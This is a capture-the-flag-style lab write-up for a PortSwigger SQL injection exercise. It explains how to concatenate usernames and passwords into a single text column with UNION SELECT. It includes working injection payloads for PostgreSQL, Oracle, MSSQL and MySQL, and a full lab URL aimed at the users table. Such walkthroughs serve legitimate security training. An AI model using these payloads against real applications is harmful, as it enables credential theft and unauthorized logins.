# Lab 06 — SQL injection UNION attack, retrieving multiple values in a single column

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | UNION attacks |
| **Concept** | [07 — UNION attacks](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column |

---

## 🎯 Objective
The query returns two columns, but **only one holds text**. Retrieve both `username` and `password` from the `users` table through that single column, and **log in as `administrator`**.

## 🧠 Background
When only one column is text-compatible, concatenate multiple fields into that one column using a **separator** so you can read them apart. This lab is **PostgreSQL**, whose concatenation operator is `||`.

## 🪜 Methodology
1. Confirm 2 columns and find the text one:
   ```
   ?category=Gifts' UNION SELECT NULL,'abc'--     (second column renders → text)
   ?category=Gifts' UNION SELECT 'abc',NULL--     (errors → first column not text)
   ```
2. Concatenate `username` + separator + `password` into the text column:
   ```
   ?category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--
   ```
3. In the response you'll see rows like `administrator~s3cr3tp4ss`. Split on `~`.
4. Log in as `administrator`.

## 💥 Payload
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

### Same idea on other engines
```sql
-- Oracle / PostgreSQL
' UNION SELECT NULL, username || '~' || password FROM users--
-- Microsoft SQL Server
' UNION SELECT NULL, username + '~' + password FROM users--
-- MySQL (comma-separated CONCAT)
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--
```

## ✅ Why it works
`||` joins the two field values (with `~` between) into one string that fits the single text column, letting you exfiltrate multiple fields per row despite the column limit.

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Step 4 of UNION: one text column is enough — concatenate with a separator. `#sqli` `#practitioner` `#union` `#postgresql`
